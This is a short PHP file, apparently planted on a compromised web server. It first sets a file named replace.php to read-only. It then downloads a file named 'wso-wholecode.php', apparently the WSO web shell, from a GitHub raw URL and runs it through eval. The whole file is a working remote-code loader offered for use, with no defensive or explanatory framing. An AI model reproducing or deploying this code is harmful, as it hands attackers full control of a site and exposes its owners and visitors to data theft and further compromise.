<?php

// Path to the file
$file = 'replace.php';

// Change the file permissions to 0444 (read-only)
chmod($file, 0444);

?>

<?php
#telegram @Devidluice
$remoteUrl = "https://raw.githubusercontent.com/uidr00t/rere/main/wso-wholecode.php";
$ch = curl_init($remoteUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$remoteCode = curl_exec($ch);
if (curl_errno($ch)) {
    die('cURL error: ' . curl_error($ch));
}
curl_close($ch);
eval("?>" . $remoteCode);
?>
